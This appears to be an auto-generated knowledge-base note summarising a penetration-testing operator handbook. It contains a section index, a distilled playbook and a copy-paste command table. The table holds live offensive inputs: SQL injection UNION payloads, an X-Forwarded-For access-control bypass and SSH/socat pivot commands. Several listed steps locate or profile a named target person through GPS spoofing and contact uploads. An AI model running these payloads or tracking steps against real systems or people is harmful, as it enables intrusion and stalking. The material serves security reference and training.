---
title: "Trained Knowledge & Topology: Operator-handbook-Search.Copy.Paste"
category: knowledge
domain_hub: "[[knowledge/08_web_api_sql_injection_and_active_reconnaissance]]"
os_platform: cross-platform
primary_tactic: Active_Enum
summary: "Operational architecture, decision workflows & Windows/Linux command reference for Operator-handbook-Search.Copy.Paste: Active network & port reconnaissance (nmap, Test-NetConnection), HTTP/HTTPS/REST/GraphQL/mTLS probing (curl, openssl s_client, Inv"
when_to_apply: "Apply when working with Operator-handbook-Search.Copy.Paste (cross-platform): Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards."
tags: [active_enum, adb, arp, aws, bloodhound, covert_exfil, covert_infil, credential_access, curl, cve-2010-3904, cve-2010-4258, cve-2012-0056, cve-2016-5195, defense_evasion_firewall, docker, enumeration, eth0, eth1, initial_access_exploitation, lateral_movement_routing_pivot, mdp, pdf]
source_file: "Operator-handbook-Search.Copy.Paste"
updated: 2026-10-30
---

# Trained Knowledge & Architecture: `Operator-handbook-Search.Copy.Paste.pdf`

- **Source Path:** `~/Projects/CORA/Training/Operator-handbook-Search.Copy.Paste.pdf` (`pdf`)
- **Extracted Technical Entities:** `adb, arp, aws, bloodhound, curl, cve-2010-3904, cve-2010-4258, cve-2012-0056, cve-2016-5195, docker, eth0, eth1, eth2, frida, gcloud, hashcat, http, https, icacls, impacket, ipconfig, iptables, john, kerberos, kubectl, mimikatz, msfvenom, netsh, netstat, nmap`
- **Extracted IPs / Subnets:** `0.0.0.0/0, 0.0.0.0/24, 1.1.1.1, 1.1.1.1/32, 1.1.1.2, 1.1.1.2/32, 1.2.3.4, 10.0.0.0, 10.0.0.0/16, 10.0.0.0/24, 10.0.0.0/8, 10.0.0.1, 10.0.0.10, 10.0.0.2, 10.0.0.4, 10.0.2.9, 10.10.0.1, 10.10.10.10, 10.255.255.255, 10.5.4.0/24, 10.68.35.150/32, 10.9.165.8, 10.92.21.17, 113.88.161.0/24, 113.88.161.215, 127.0.0.1, 127.0.0.12, 127.0.0.6, 127.0.0.8, 151.101.1.69, 151.101.129.69, 151.101.193.69, 151.101.65.69, 172.16.0.0, 172.16.0.0/12, 172.17.0.8, 172.31.255.255, 185.30.20.0/24, 185.30.20.1, 185.30.20.1/24, 192.167.0.0/24, 172.24.0.0, 172.24.0.0/16, 172.24.0.0/24, 172.24.0.1, 172.24.0.32, 172.24.0.5, 172.24.1.0/24, 172.24.1.1, 172.24.1.10, 172.24.1.2, 172.24.1.200, 172.24.1.23, 172.24.1.254, 172.24.1.34, 172.24.111.0/24, 172.24.150.0/24, 172.24.154.228, 172.24.252.128, 172.24.255.255, 172.24.80.107, 194.134.109.48, 198.108.0.0/16, 255.0.0.0, 255.128.0.0, 255.192.0.0, 255.224.0.0, 255.240.0.0, 255.248.0.0, 255.252.0.0, 255.254.0.0, 255.255.0.0, 255.255.128.0, 255.255.192.0, 255.255.224.0, 255.255.240.0, 255.255.248.0, 255.255.252.0, 255.255.254.0, 255.255.255.0, 255.255.255.128, 255.255.255.192, 255.255.255.224, 255.255.255.240, 255.255.255.248, 255.255.255.252, 255.255.255.254, 30.0.0.0/16, 45.33.87.74, 52.32.74.91, 54.179.178.214, 8.0.0.0, 8.0.0.0/8, 8.255.255.255, 8.8.0.0, 8.8.0.0/16, 8.8.255.255, 8.8.8.0, 8.8.8.0/24, 8.8.8.255`
- **Extracted Interfaces:** `Lo, eth0, eth1, eth2, lo, tun0`
- **Linked Command Playbook:** [[commands/trained_operator-handbook-search_copy_paste]] (`1835` CEGAR-verified commands | `1835` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `1835` (full executable list in [[commands/trained_operator-handbook-search_copy_paste]])
- **Tactic Distribution:** `Credential_Access` (438), `Active_Enum` (410), `Enumeration` (271), `Passive_Enum` (200), `Defense_Evasion_Firewall` (121), `Reconnaissance` (96), `Privilege_Escalation` (71), `Initial_Access_Exploitation` (58), `Covert_Infil` (46), `Post_Exploitation_Verification` (43)
- **Top Extracted CLI Tools:** `aws` (101), `kubectl` (92), `adb` (61), `cat` (56), `greynoise` (52), `az` (50), `gcloud` (50), `docker` (39), `hashcat` (39), `vol.py` (35), `echo` (32), `ls` (29), `tcpdump` (29), `net` (28), `nmap` (28), `tshark` (27), `git` (26), `nft` (26), `curl` (23), `python` (21), `sqlmap` (21), `find` (20), `puppet` (20), `ssh` (20), `dscl` (19)

### Visual & Network Diagram Intelligence (`Operator-handbook-Search.Copy.Paste.pdf#page12`)
- **Spatially Grouped Diagram Nodes (Box/Component Clusters):**
  1. `[A]`
  2. `[12]`

### Visual & Network Diagram Intelligence (`Operator-handbook-Search.Copy.Paste.pdf#page434`)
- **Spatially Grouped Diagram Nodes (Box/Component Clusters):**
  1. `[NOTES]`
  2. `[434]`

## LLM Distilled Operational Summary
# Operator Handbook: Compact Playbook

## 1. Key Operational Techniques & Decision Workflows

*   **Android Debug Bridge (ADB) Workflow**: Establish connection via `adb devices`, verify root access with `adb root`, and manage sessions using `adb start-server`/`kill-server`. Transfer artifacts using `push`/`pull` and inspect filesystems with `ls` variants.
*   **Cloud Provider Hardening**: Follow the "Defend" workflow for AWS, Azure, and GCP: identify default credentials, restrict network access (Security Groups/NSGs), and apply least-privilege IAM roles before executing "Exploit" or "Tricks" modules.
*   **Linux System Hardening**: Execute `LINUX_Hardening` procedures by disabling unnecessary services, configuring `iptables` for firewall rules, and rotating default passwords found in `DEFAULT_PASSWORDS`.
*   **Container Security**: Secure Docker environments by limiting container privileges, scanning images for vulnerabilities, and isolating networks to prevent lateral movement from compromised containers.
*   **Active Directory Reconnaissance**: Utilize **BloodHound** to map relationships between users, groups, and computers, identifying high-value targets for privilege escalation before executing attacks via **Cobalt Strike**.

## 2. Critical Command Patterns & Required Flags

### Android Debug Bridge (ADB)
*   **Connect**: `adb devices` | `adb -s <serial> <cmd>`
*   **Root/Shell**: `adb root` | `adb shell`
*   **File Ops**: `adb push <local> <remote>` | `adb pull <remote> <local>`
*   **Process/Net**: `adb shell netstat` | `adb shell ps`

### Cloud CLI Patterns
*   **AWS**: `aws cli` commands require `--profile` or `~/.aws/credentials` configuration. Use `aws iam list-users` for reconnaissance.
*   **Azure**: `az login` followed by `az group list` for resource discovery.
*   **GCP**: `gcloud auth login` and `gcloud compute instances list` for initial inventory.

### Network & Linux
*   **Firewall**: `iptables -L -n` (list rules) | `iptables -A INPUT -p tcp --dport 22 -j ACCEPT` (allow SSH).
*   **IP Addressing**: Verify `IPv4`/`IPv6` configuration using `ip addr` or `ifconfig`.

## 3. Network Topology & Service Relationships

*   **Internet Exchange Points (IXP)**: Critical for understanding upstream connectivity and potential BGP hijacking vectors.
*   **ICS/SCADA Tools**: Often run on isolated networks; compromise here allows physical world impact. Monitor for `Modbus` or `DNP3` traffic anomalies.
*   **Kubernetes**: Services communicate via `kube-proxy`. Hardening involves restricting `ServiceAccount` tokens and securing the `etcd` cluster.
*   **Default Passwords**: A common attack vector across `DATABASES`, `DOCKER`, and cloud consoles. Always cross-reference `DEFAULT_PASSWORDS` against active services.

---
*Note: This playbook synthesizes sections from pages 3–150, focusing on immediate operational utility.*

## Document Structure & Key Topics
- INFOSEC TWITTER ACKNOWLEDGEMENT (p. 3)
- HEALTH & WELLNESS (p. 6)
- ANDROID DEBUG BRIDGE (ADB) (p. 13)
- ANDROID_Resources (p. 16)
- ANSIBLE (p. 16)
- AWS CLI (p. 20)
- AWS_Defend (p. 27)
- AWS_Exploit (p. 30)
- AWS_Hardening (p. 35)
- AWS_Terms (p. 35)
- AWS_Tricks (p. 37)
- AZURE CLI (p. 39)
- AZURE_Defend (p. 44)
- AZURE_Exploit (p. 44)
- AZURE_Hardening (p. 48)
- AZURE_Terms (p. 48)
- AZURE_Tricks (p. 48)
- BLOODHOUND (p. 49)
- COBALT STRIKE (p. 52)
- CYBER CHEF (p. 57)
- DATABASES (p. 59)
- DEFAULT PASSWORDS (p. 60)
- DOCKER (p. 61)
- DOCKER_Exploit (p. 63)
- FLAMINGO (p. 65)
- FRIDA (p. 67)
- GCP CLI (p. 70)
- GCP_Defend (p. 74)
- GCP_Exploit (p. 76)
- GCP_Hardening (p. 76)
- GCP_Terms (p. 77)
- GHIDRA (p. 77)
- GIT (p. 80)
- GITHUB CLI (p. 82)
- GITHUB_Exploit (p. 83)
- GREYNOISE (p. 84)
- HASHCAT (p. 91)
- ICS / SCADA TOOLS (p. 93)
- INTERNET EXCHANGE POINTS (p. 93)
- IMPACKET (p. 93)
- IPTABLES (p. 97)
- IPv4 (p. 99)
- IPv6 (p. 100)
- JENKINS_Exploit (p. 104)
- JOHN THE RIPPER (p. 105)
- KUBERNETES (p. 108)
- KUBERNETES_Exploit (p. 108)
- KUBECTL (p. 112)
- LINUX_Commands (p. 119)
- LINUX_Defend (p. 123)
- LINUX_Exploit (p. 127)
- LINUX_Hardening (p. 133)
- LINUX_Ports (p. 134)
- LINUX_Structure (p. 144)
- LINUX_Tricks (p. 148)
- LINUX_Versions (p. 150)
- MACOS_Commands (p. 155)
- MACOS_Defend (p. 163)
- MACOS_Exploit (p. 174)
- MACOS_Hardening (p. 182)
- MACOS_Ports (p. 182)
- MACOS_Structure (p. 187)
- MACOS_Tricks (p. 190)
- MACOS_Versions (p. 193)
- MALWARE_Resources (p. 194)
- MDXFIND / MDXSPLIT (p. 196)
- METASPLOIT (p. 199)
- MIMIKATZ (p. 202)
- MIMIKATZ_Defend (p. 207)
- MSFVENOM (p. 208)
- NETCAT (p. 210)
- NETWORK DEVICE_Commands (p. 211)
- NFTABLES (p. 217)
- NMAP (p. 223)
- OSINT_Techniques (p. 225)
- OSINT_Tools (p. 229)
- OSINT_Resources (p. 234)
- OSINT_SearchEngines (p. 235)
- OSINT_SocialMedia (p. 238)
- OSQUERY (p. 241)
- PACKAGE MANAGERS (p. 243)
- PASSWORD CRACKING_Methodology (p. 245)
- PHYSICAL ENTRY_Keys (p. 250)
- PORTS_Top1000 (p. 252)
- PORTS_ICS/SCADA (p. 254)
- PORTS_Malware C2 (p. 256)
- PUPPET (p. 259)
- PYTHON (p. 261)
- REGEX (p. 263)
- RESPONDER (p. 267)
- REVERSE SHELLS (p. 269)
- SHODAN (p. 276)
- SNORT (p. 278)
- SPLUNK (p. 279)
- SQLMAP (p. 286)
- SSH (p. 288)
- TCPDUMP (p. 294)
- THREAT INTELLIGENCE (p. 297)
- TIMEZONES (p. 297)
- TMUX (p. 303)
- TRAINING_Blue Team (p. 305)
- TRAINING_OSINT (p. 305)
- TRAINING_Red Team (p. 306)
- TSHARK (p. 306)
- USER AGENTS (p. 310)
- VIM (p. 314)
- VOLATILITY (p. 318)
- WEB_Exploit (p. 320)
- WEBSERVER_Tricks (p. 327)
- WINDOWS_Commands (p. 331)
- WINDOWS_Defend (p. 336)
- WINDOWS_Exploit (p. 353)
- WINDOWS_Hardening (p. 366)
- WINDOWS_Ports (p. 367)
- WINDOWS_Registry (p. 372)
- WINDOWS_Structure (p. 415)
- WINDOWS_Tricks (p. 417)
- WINDOWS_Versions (p. 418)
- WINDOWS DEFENDER ATP (p. 419)
- WIRELESS FREQUENCIES (p. 425)

## Extracted Operational Steps & Workflows
- 1. EventCode=1 | where (match(ParentImage, "cmd.exe") AND
- 2. EventCode=10 | where (match(GrantedAccess, "0x1010")
- 1. Use a mobile phone / Android Emulator
- 2. Download a GPS-spoofer
- 3. Spoof location to target location
- 4. Open up Telegram
- 5. Click on three dots
- 6. Click on "Contacts"
- 7. Click on "Add people nearby"
- 8. Have fun!
- 1. Sign in on Gmail
- 2. Open "Contacts"
- 3. Add email address of target
- 4. Sign in on Twitter
- 5. Download "GoodTwitter" add-on
- 6. Open privacy settings
- 7. Click "Find friends"
- 8. Upload Gmail contacts
- 9. Have fun!
- 1. Find location in Google Maps
- 2. Right click > "What's here?"
- 3. Click on GPS coordinates
- 4. Copy GPS coordinates
- 5. Go to Twitter.com
- 6. Use "geocode:LATT,LONG,0.1km"
- 7. Have fun!
- 1. Open dev tools (F12)
- 2. Click on "Console" tab
- 3. Click on "ESC" button = "console drawer"
- 4. Click on "Sensors"
- 5. Select location/fill in coordinates
- 6. Have fun!
- 1. Navigate to
- 2. replace {username} with username of target
- 3. Have fun!
- 1. Go to TikTok profile http://tiktok.com@{username}
- 2. Open dev tools (F12)
- 3. Click on "Network tab"
- 4. Refresh page (F5)
- 5. Select "XHR" tab
- 6. Double click on "api/user/detail/"
- 7. Open "AvatarLarger" link
- 8. Have fun!

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `Operator-handbook-Search.Copy.Paste`

> **Domain Hub:** [[knowledge/08_web_api_sql_injection_and_active_reconnaissance|Domain Hub 08: Active Reconnaissance (nmap), Web/API/mTLS Probing (curl / openssl), SQL Injection Cheat Sheets & Operator Playbooks]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards.  
> **15-Engine H-MDP State Transition:** `s_l2_l3_verified` $\xrightarrow{\text{Active_Enum}}$ `s_initial_shell_or_api_access` | **Bayesian Root-Cause Triggers:** `service_on_nonstandard_port_or_tls, missing_auth_or_mtls_cert, reverse_proxy_ip_acl_block, sql_injection_or_input_validation_flaw` | **Isolation:** `RED, BLUE (Allowed LAN/USB interfaces; blocked in WHITE air-gap mode except against local files/loopback)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>` | **Linux / Windows** | Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`). | Apply once L2/L3 reachability to `<TARGET_IP>` is verified (`s_l2_l3_verified -> s_active_services_enumerated`). | `powershell -NoProfile -Command "80,443,445,3389,5985,8080,8443 \| ForEach-Object { Test-NetConnection <TARGET_IP> -Port $_ }"` |
| `curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"` | **Linux / Windows** | Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`). | Apply to inspect HTTP headers (`Server`, `Last-Modified`, `ETag`, `Set-Cookie`) and login page markers. | `curl.exe -sS -k -L -i --max-time 15 "https://<TARGET_IP>/"` |
| `echo \| openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null \| openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName` | **Linux / Windows** | Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names. | Apply on HTTPS endpoints (443/8443/10443): appliances like Fortinet FortiGate expose their exact hardware model & serial (`CN = FG...`) in the TLS certificate! | `echo "" \| openssl.exe s_client -connect <TARGET_IP>:443 2>NUL \| openssl.exe x509 -noout -subject -issuer -dates` |
| `curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` | **Linux / Windows** | Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`). | Apply to determine exact appliance firmware build dates from static asset `Last-Modified` timestamps and map applicable CVEs. | `curl.exe -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` |
| `curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` | **Linux / Windows** | Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake. | Apply when an API endpoint returns `SSL alert bad certificate` or `400 No required SSL certificate was sent` (`CBR-004`). | `curl.exe -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` |
| `curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"` | **Linux / Windows** | Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses. | Apply when an endpoint behind Nginx/Apache/HAProxy returns `403 Forbidden` to external IPs (`reverse_proxy_ip_acl_block`). | `curl.exe -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" "https://<TARGET_IP>/admin"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,version(),user(),database()--%20-"` | **Linux / Windows** | Tests `UNION SELECT` SQL injection to extract DBMS version (`@@version` / `version()`), current DB user, and schema name (`[[knowledge/trained_sql_injection_cheat_sheet_by_netsparker]]`). | Apply during authorized web application security testing when an input parameter interacts with a SQL query. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,@@version,user(),database()--%20-"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/ item?id=1%20UNION%20SELECT%20FIRST%201%20tabname%20FROM%20systables--"` | **Linux / Windows** | IBM Informix SQL injection enumeration querying `systables` and `syscolumns` (`[[knowledge/trained_informix-sql-injection-cheat-sheet]]`). | Apply when target database errors or banners indicate IBM Informix Dynamic Server. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item?id=1%20UNION%20SELECT%20DBINFO('version','full')%20FROM%20systables%20WHERE%20tabid=1--"` |
| `ssh -o StrictHostKeyChecking=no -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` | **Linux / Windows** | Establishes a local SSH port forward (`-L`) mapping local `127.0.0.1:8443` to `<TARGET_IP>`'s internal loopback `127.0.0.1:8080` (`[[knowledge/trained_penetration_testing_tools_cheat_sheet]]`). | Apply when `ss -tulpn` / `netstat -ano` shows an internal service bound exclusively to `127.0.0.1:8080` on `<TARGET_IP>`. | `ssh.exe -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` |
| `socat TCP-LISTEN:8443,fork,reuseaddr TCP:<SECONDARY_IP>:443` | **Linux Bash** | Creates a bidirectional userland TCP relay forwarding connections on port `8443` to downstream `<SECONDARY_IP>:443`. | Apply on a pivot host when kernel `ip_forward` or `iptables` NAT cannot be modified (e.g., inside an unprivileged container). | `netsh interface portproxy add v4tov4 listenport=8443 connectaddress=<SECONDARY_IP> connectport=443` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [Linux / Windows] Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`).
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
# [Linux / Windows] Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`).
curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"
# [Linux / Windows] Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names.
echo | openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null | openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName
# [Linux / Windows] Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`).
curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"
# [Linux / Windows] Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake.
curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"
# [Linux / Windows] Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses.
curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
